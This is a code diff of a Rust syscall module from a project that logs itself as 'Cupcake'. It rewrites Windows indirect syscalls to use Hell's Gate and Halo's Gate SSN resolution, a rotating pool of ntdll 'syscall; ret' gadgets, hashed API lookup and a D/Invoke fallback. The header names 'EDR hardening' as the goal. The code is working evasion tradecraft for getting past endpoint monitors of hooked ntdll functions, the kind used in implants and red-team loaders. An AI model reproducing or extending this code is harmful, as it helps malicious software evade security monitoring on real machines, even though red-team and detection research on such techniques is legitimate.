@@ -1,165 +1,303 @@
 // Syscall Resolution & Execution Module
 //
-// x86_64: Indirect syscalls via SSN resolution + gadget
+// x86_64: Indirect syscalls via lazy SSN resolution (Hell's/Halo's Gate) + gadget pool
 // x86: Direct ntdll API calls (no indirect syscall on 32-bit)
 //
 // Supports: Windows Vista SP2+ (both 32-bit and 64-bit)
+//
+// Design goals (EDR hardening):
+// - No eager full-export Nt* SSN scan at startup
+// - Resolve SSN only for requested hashes (with neighbor search if hooked)
+// - Maintain a small rotating pool of `syscall; ret` gadgets (no repeated .text sweeps)
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-use std::collections::BTreeMap;
+use std::collections::HashMap;
 #[cfg(all(windows, target_arch = "x86_64"))]
-use log::error;
+use std::sync::{Mutex, OnceLock};
+#[cfg(all(windows, target_arch = "x86_64"))]
+use std::sync::atomic::{AtomicUsize, Ordering};
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
-
+use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_SECTION_HEADER};
 #[cfg(all(windows, target_arch = "x86_64"))]
 use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
 
-// x86 IMAGE_NT_HEADERS (used by PEB module, not directly here)
-#[cfg(all(windows, target_arch = "x86"))]
-#[allow(unused_imports)]
-use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
-
 // ═══════════════════════════════════════════════════════════════════════════════
-// x86_64: Full indirect syscall support
+// x86_64: Lazy SSN + gadget pool
 // ═══════════════════════════════════════════════════════════════════════════════
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-lazy_static::lazy_static! {
-    static ref SYSCALL_MAP: BTreeMap<u32, u16> = unsafe { resolve_all_ssns() };
-    static ref SYSCALL_GADGET: usize = unsafe { find_syscall_gadget() };
+const MAX_GADGETS: usize = 8;
+/// Typical x64 ntdll Nt* stub stride used by Halo's Gate neighbor walk.
+#[cfg(all(windows, target_arch = "x86_64"))]
+const STUB_STRIDE: usize = 0x20;
+#[cfg(all(windows, target_arch = "x86_64"))]
+const HALO_MAX_NEIGHBORS: usize = 500;
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+struct SyscallState {
+    ssn_cache: HashMap<u32, u16>,
+    gadgets: Vec<usize>,
 }
 
-/// Resolves SSNs for all Nt* functions in ntdll.dll by sorting them by address.
 #[cfg(all(windows, target_arch = "x86_64"))]
-unsafe fn resolve_all_ssns() -> BTreeMap<u32, u16> {
-    let mut map = BTreeMap::new();
-    let ntdll_base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
-    if ntdll_base == 0 { return map; }
+fn syscall_state() -> &'static Mutex<SyscallState> {
+    static STATE: OnceLock<Mutex<SyscallState>> = OnceLock::new();
+    STATE.get_or_init(|| {
+        // Acceptance signal: no eager Nt* SSN scan at startup.
+        crate::utils::db_print(
+            "[Cupcake] syscall layer: lazy resolved 0 on init (SSN on-demand)",
+        );
+        Mutex::new(SyscallState {
+            ssn_cache: HashMap::new(),
+            gadgets: Vec::with_capacity(MAX_GADGETS),
+        })
+    })
+}
 
-    let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
-    let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
-    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
-    if export_dir_rva == 0 { return map; }
+#[cfg(all(windows, target_arch = "x86_64"))]
+static GADGET_RR: AtomicUsize = AtomicUsize::new(0);
 
-    let export_dir = (ntdll_base + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
-    let names = (ntdll_base + (*export_dir).AddressOfNames as usize) as *const u32;
-    let ordinals = (ntdll_base + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
-    let functions = (ntdll_base + (*export_dir).AddressOfFunctions as usize) as *const u32;
+/// Extract SSN from a clean x64 syscall stub, if present.
+#[cfg(all(windows, target_arch = "x86_64"))]
+unsafe fn extract_ssn_from_stub(addr: usize) -> Option<(u16, usize)> {
+    if addr == 0 {
+        return None;
+    }
+    let bytes = std::slice::from_raw_parts(addr as *const u8, 16);
 
-    for i in 0..(*export_dir).NumberOfNames {
-        let name_ptr = (ntdll_base + *names.add(i as usize) as usize) as *const i8;
-        let mut name_bytes = Vec::new();
-        let mut idx = 0;
-        while *name_ptr.add(idx) != 0 {
-            name_bytes.push(*name_ptr.add(idx) as u8);
-            idx += 1;
-        }
-
-        let name = String::from_utf8_lossy(&name_bytes).to_string();
-        if name.starts_with("Nt") {
-            let ordinal = *ordinals.add(i as usize);
-            let addr = ntdll_base + *functions.add(ordinal as usize) as usize;
-            
-            let bytes = std::slice::from_raw_parts(addr as *const u8, 16);
-            let mut ssn: Option<u16> = None;
-
-            // Pattern 1: 4C 8B D1, B8 XX XX XX XX (Win10/11, Win8.1, Win7 x64)
-            if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
-                ssn = Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as u16);
-            }
-            // Pattern 2: B8 XX XX XX XX, 4C 8B D1 (Some older/hooked versions)
-            else if bytes[0] == 0xB8 && bytes[5] == 0x4C && bytes[6] == 0x8B && bytes[7] == 0xD1 {
-                ssn = Some(u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]) as u16);
-            }
-
-            if let Some(s) = ssn {
-                let hash = crate::stealth::hash_api_name(name.as_bytes());
-                map.insert(hash, s);
-                
-                let zw_name = name.replacen("Nt", "Zw", 1);
-                let zw_hash = crate::stealth::hash_api_name(zw_name.as_bytes());
-                map.insert(zw_hash, s);
-            }
-        }
+    // Pattern 1: 4C 8B D1 ; B8 XX XX XX XX  (mov r10, rcx; mov eax, SSN)
+    if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
+        let ssn = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]) as u16;
+        // Prefer gadget at stub's own syscall;ret if present
+        let gadget = if bytes[8] == 0x0F && bytes[9] == 0x05 && bytes[10] == 0xC3 {
+            addr + 8
+        } else {
+            0
+        };
+        return Some((ssn, gadget));
     }
 
-    crate::utils::db_print(&format!("[Cupcake] Resolved {} syscalls via enhanced patterns.", map.len()));
-    map
+    // Pattern 2: B8 XX XX XX XX ; 4C 8B D1
+    if bytes[0] == 0xB8 && bytes[5] == 0x4C && bytes[6] == 0x8B && bytes[7] == 0xD1 {
+        let ssn = u32::from_le_bytes([bytes[1], bytes[2], bytes[3], bytes[4]]) as u16;
+        let gadget = if bytes[8] == 0x0F && bytes[9] == 0x05 && bytes[10] == 0xC3 {
+            addr + 8
+        } else {
+            0
+        };
+        return Some((ssn, gadget));
+    }
+
+    None
 }
 
-/// Finds a 'syscall; ret' gadget in ntdll.dll for indirect syscalls.
+/// Remember a gadget address (deduped, capped).
 #[cfg(all(windows, target_arch = "x86_64"))]
-unsafe fn find_syscall_gadget() -> usize {
-    let ntdll_base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
-    if ntdll_base == 0 { return 0; }
+fn remember_gadget(state: &mut SyscallState, gadget: usize) {
+    if gadget == 0 || state.gadgets.len() >= MAX_GADGETS {
+        return;
+    }
+    if !state.gadgets.contains(&gadget) {
+        state.gadgets.push(gadget);
+    }
+}
+
+/// One-shot limited harvest of `syscall; ret` gadgets from ntdll executable sections.
+/// Stops after MAX_GADGETS hits — does not rescan on subsequent calls.
+#[cfg(all(windows, target_arch = "x86_64"))]
+unsafe fn harvest_gadget_pool(state: &mut SyscallState) {
+    if !state.gadgets.is_empty() {
+        return;
+    }
+
+    let ntdll_base =
+        crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+    if ntdll_base == 0 {
+        return;
+    }
 
     let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
     let nt_headers = (ntdll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
-    
-    let section_header = (nt_headers as usize + 24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+    let section_header = (nt_headers as usize
+        + 24
+        + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
+        as *const IMAGE_SECTION_HEADER;
     let num_sections = (*nt_headers).FileHeader.NumberOfSections;
 
     for i in 0..num_sections {
+        if state.gadgets.len() >= MAX_GADGETS {
+            break;
+        }
         let section = *section_header.add(i as usize);
-        if (section.Characteristics & 0x20000000) != 0 {
-            let addr = ntdll_base + section.VirtualAddress as usize;
-            let size = *section.Misc.VirtualSize() as usize;
-            if size < 3 { continue; }
-            let mem = std::slice::from_raw_parts(addr as *const u8, size);
+        // IMAGE_SCN_MEM_EXECUTE
+        if (section.Characteristics & 0x2000_0000) == 0 {
+            continue;
+        }
+        let addr = ntdll_base + section.VirtualAddress as usize;
+        let size = *section.Misc.VirtualSize() as usize;
+        if size < 3 {
+            continue;
+        }
 
-            for j in 0..size - 3 {
-                // syscall (0F 05) + ret (C3)
-                if mem[j] == 0x0F && mem[j+1] == 0x05 && mem[j+2] == 0xC3 {
-                    let gadget = addr + j;
-                    crate::utils::db_print(&format!("[Cupcake] Found indirect syscall gadget at: 0x{:X}", gadget));
-                    return gadget;
-                }
+        // Cap scan window to reduce anomalous full-section reads
+        let scan_len = size.min(0x20000);
+        let mem = std::slice::from_raw_parts(addr as *const u8, scan_len);
+        let mut j = 0;
+        while j + 2 < scan_len && state.gadgets.len() < MAX_GADGETS {
+            if mem[j] == 0x0F && mem[j + 1] == 0x05 && mem[j + 2] == 0xC3 {
+                remember_gadget(state, addr + j);
+                // Skip ahead — stubs are spaced; avoid dense duplicate hits
+                j += STUB_STRIDE;
+            } else {
+                j += 1;
             }
         }
     }
 
-    error!("Failed to find syscall gadget in ntdll!");
-    0
+    if state.gadgets.is_empty() {
+        crate::utils::db_print("[Cupcake] Gadget pool empty after limited harvest");
+    } else {
+        crate::utils::db_print(&format!(
+            "[Cupcake] Gadget pool ready: {} entries",
+            state.gadgets.len()
+        ));
+    }
+}
+
+/// Lazy SSN resolve: cache → clean stub → Halo's Gate neighbors.
+#[cfg(all(windows, target_arch = "x86_64"))]
+unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
+    {
+        let state = syscall_state().lock().ok()?;
+        if let Some(&ssn) = state.ssn_cache.get(&hash) {
+            return Some(ssn);
+        }
+    }
+
+    let ntdll_base =
+        crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+    if ntdll_base == 0 {
+        return None;
+    }
+
+    let api_addr = crate::stealth::get_api_addr(ntdll_base, hash).unwrap_or(0);
+    if api_addr == 0 {
+        return None;
+    }
+
+    // Hell's Gate: clean stub at target
+    if let Some((ssn, gadget)) = extract_ssn_from_stub(api_addr) {
+        if let Ok(mut state) = syscall_state().lock() {
+            state.ssn_cache.insert(hash, ssn);
+            remember_gadget(&mut state, gadget);
+            if state.gadgets.is_empty() {
+                harvest_gadget_pool(&mut state);
+            }
+        }
+        return Some(ssn);
+    }
+
+    // Halo's Gate: walk neighboring stubs by fixed stride
+    for i in 1..=HALO_MAX_NEIGHBORS {
+        let down = api_addr.wrapping_add(i * STUB_STRIDE);
+        if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(down) {
+            let ssn = neigh_ssn.wrapping_sub(i as u16);
+            if let Ok(mut state) = syscall_state().lock() {
+                state.ssn_cache.insert(hash, ssn);
+                remember_gadget(&mut state, gadget);
+                if state.gadgets.is_empty() {
+                    harvest_gadget_pool(&mut state);
+                }
+            }
+            return Some(ssn);
+        }
+
+        let up = api_addr.wrapping_sub(i * STUB_STRIDE);
+        if up < ntdll_base {
+            break;
+        }
+        if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(up) {
+            let ssn = neigh_ssn.wrapping_add(i as u16);
+            if let Ok(mut state) = syscall_state().lock() {
+                state.ssn_cache.insert(hash, ssn);
+                remember_gadget(&mut state, gadget);
+                if state.gadgets.is_empty() {
+                    harvest_gadget_pool(&mut state);
+                }
+            }
+            return Some(ssn);
+        }
+    }
+
+    // Ensure gadget pool exists even if SSN failed (for other calls)
+    if let Ok(mut state) = syscall_state().lock() {
+        if state.gadgets.is_empty() {
+            harvest_gadget_pool(&mut state);
+        }
+    }
+
+    None
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+fn pick_gadget() -> usize {
+    let Ok(mut state) = syscall_state().lock() else {
+        return 0;
+    };
+    if state.gadgets.is_empty() {
+        unsafe {
+            harvest_gadget_pool(&mut state);
+        }
+    }
+    if state.gadgets.is_empty() {
+        return 0;
+    }
+    let idx = GADGET_RR.fetch_add(1, Ordering::Relaxed) % state.gadgets.len();
+    state.gadgets[idx]
 }
 
 /// x86_64 indirect syscall execution
 #[cfg(all(windows, target_arch = "x86_64"))]
 pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
     let mut use_fallback = false;
-    let ssn = match SYSCALL_MAP.get(&hash) {
-        Some(&s) => s,
+    let ssn = match resolve_ssn(hash) {
+        Some(s) => s,
         None => {
-            crate::utils::db_print(&format!("[Cupcake] SSN not found for 0x{:X}, using D/Invoke fallback", hash));
+            crate::utils::db_print(&format!(
+                "[Cupcake] SSN not found for 0x{:X}, using D/Invoke fallback",
+                hash
+            ));
             use_fallback = true;
             0
-        },
+        }
     };
 
-    let gadget = *SYSCALL_GADGET;
-    if gadget == 0 && !use_fallback { 
+    let gadget = pick_gadget();
+    if gadget == 0 && !use_fallback {
         crate::utils::db_print("[Cupcake] No syscall gadget, using D/Invoke fallback");
-        use_fallback = true; 
+        use_fallback = true;
     }
-
-    let mut result: i32;
 
     let mut a = [0usize; 11];
     for (i, &v) in args.iter().enumerate() {
-        if i < 11 { a[i] = v; }
+        if i < 11 {
+            a[i] = v;
+        }
     }
 
     if use_fallback {
         return direct_api_call(hash, &a);
     }
 
-    // Indirect syscall via gadget
+    let mut result: i32;
+
+    // Indirect syscall via gadget from pool
     std::arch::asm!(
         "mov r12, rsp",
         "sub rsp, 0x68",
         "and rsp, -16",
-        
+
         "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
         "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
         "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
@@ -167,12 +305,12 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
         "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
         "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
         "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",
-        
+
         "mov r10, rcx",
         "call r15",
-        
+
         "mov rsp, r12",
-        
+
         inout("rax") ssn as i32 => result,
         in("r14") a.as_ptr(),
         in("r15") gadget,
@@ -193,18 +331,23 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
 /// D/Invoke fallback: call ntdll API directly by hash (x86_64)
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn direct_api_call(hash: u32, a: &[usize; 11]) -> i32 {
-    let ntdll_base = crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
-    if ntdll_base == 0 { return -1; }
-    
+    let ntdll_base =
+        crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+    if ntdll_base == 0 {
+        return -1;
+    }
+
     let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
-    if api_addr == 0 { return -1; }
+    if api_addr == 0 {
+        return -1;
+    }
 
     let mut result: i32;
     std::arch::asm!(
         "mov r12, rsp",
         "sub rsp, 0x68",
         "and rsp, -16",
-        
+
         "mov r13, [r14 + 32]", "mov [rsp + 0x20], r13",
         "mov r13, [r14 + 40]", "mov [rsp + 0x28], r13",
         "mov r13, [r14 + 48]", "mov [rsp + 0x30], r13",
@@ -212,10 +355,10 @@ unsafe fn direct_api_call(hash: u32, a: &[usize; 11]) -> i32 {
         "mov r13, [r14 + 64]", "mov [rsp + 0x40], r13",
         "mov r13, [r14 + 72]", "mov [rsp + 0x48], r13",
         "mov r13, [r14 + 80]", "mov [rsp + 0x50], r13",
-        
+
         "call r15",
         "mov rsp, r12",
-        
+
         in("r14") a.as_ptr(),
         in("r15") api_addr,
         out("r12") _,
@@ -232,36 +375,35 @@ unsafe fn direct_api_call(hash: u32, a: &[usize; 11]) -> i32 {
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // x86 (32-bit): Direct ntdll API calls via PEB resolution
-// No indirect syscalls on 32-bit (sysenter/int 2E is complex and version-dependent)
 // ═══════════════════════════════════════════════════════════════════════════════
 
-/// x86 syscall implementation: resolves ntdll API by hash and calls it directly.
-/// Uses stdcall convention — all arguments passed on the stack.
+/// x86: resolve ntdll API by hash and call directly (stdcall).
 #[cfg(all(windows, target_arch = "x86"))]
 pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
-    let ntdll_base = crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
-    if ntdll_base == 0 { return -1; }
-    
-    let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
-    if api_addr == 0 {
-        crate::utils::db_print(&format!("[Cupcake][x86] API not found for hash 0x{:X}", hash));
+    let ntdll_base =
+        crate::stealth::peb::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
+    if ntdll_base == 0 {
         return -1;
     }
 
-    // x86 stdcall: push args right-to-left, then call
-    // stdcall callee cleans up the stack
+    let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
+    if api_addr == 0 {
+        crate::utils::db_print(&format!(
+            "[Cupcake][x86] API not found for hash 0x{:X}",
+            hash
+        ));
+        return -1;
+    }
+
     let argc = args.len();
     let result: i32;
     let args_ptr = args.as_ptr();
-    
+
     std::arch::asm!(
-        // Save ESP
         "mov edi, esp",
-        // Push args right-to-left using a loop
         "mov ecx, {argc}",
         "test ecx, ecx",
         "jz 99f",
-        // edx = &args[argc - 1]
         "mov edx, {args_ptr}",
         "lea edx, [edx + ecx*4 - 4]",
         "98:",
@@ -270,11 +412,9 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
         "dec ecx",
         "jnz 98b",
         "99:",
-        // Call the API
         "call {func}",
-        // Restore ESP (stdcall should have cleaned up, but be safe)
         "mov esp, edi",
-        
+
         argc = in(reg) argc,
         args_ptr = in(reg) args_ptr,
         func = in(reg) api_addr,
